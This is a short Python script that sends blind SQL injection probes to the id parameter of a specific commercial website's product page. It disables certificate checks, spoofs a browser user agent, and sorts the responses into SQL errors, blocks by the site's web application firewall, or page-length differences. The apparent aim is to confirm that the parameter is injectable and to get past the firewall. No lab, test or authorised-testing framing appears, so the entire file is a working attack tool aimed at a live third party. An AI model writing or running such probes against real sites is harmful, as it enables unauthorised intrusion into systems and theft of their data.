#!/usr/bin/env python3
import urllib.request, urllib.parse, ssl, re
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
BASE = 'http://www.yijingweb.com/webmall/detail.php?id='

def get(payload):
    url = BASE + urllib.parse.quote(payload, safe='')
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=12, context=ctx)
        return r.read(80000).decode('utf-8','ignore')
    except urllib.error.HTTPError as e:
        return e.read(80000).decode('utf-8','ignore')
    except Exception as e:
        return 'ERR:%s' % repr(e)[:80]

tests = [
    ('if(1=1)', "687' and if(1=1,687,0)#"),
    ('if(1=2)', "687' and if(1=2,687,0)#"),
    ('if(ascii(a)=97)', "687' and if(ascii('a')=97,687,0)#"),
    ('if(ascii(a)=65)', "687' and if(ascii('a')=65,687,0)#"),
    ('if(97=97)', "687' and if(97=97,687,0)#"),
    ('if(a=a)', "687' and if('a'='a',687,0)#"),
]
for name, p in tests:
    b = get(p)
    if 'Invalid SQL' in b:
        m = re.search(r'Invalid SQL: ([^<]+)', b)
        print('%s -> SQLERR: %s' % (name, m.group(1)[:100] if m else ''))
    elif 'WTS-WAF' in b:
        print('%s -> WAF' % name)
    else:
        print('%s -> len=%d 含产品展示模块=%s' % (name, len(b), '产品展示模块' in b))
